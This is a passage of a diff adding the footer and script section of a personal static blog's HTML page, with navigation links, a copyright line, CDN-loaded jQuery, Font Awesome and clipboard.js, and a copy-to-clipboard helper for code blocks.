+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    John Doe
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/life/">漂泊</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/c1y2m3">github</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
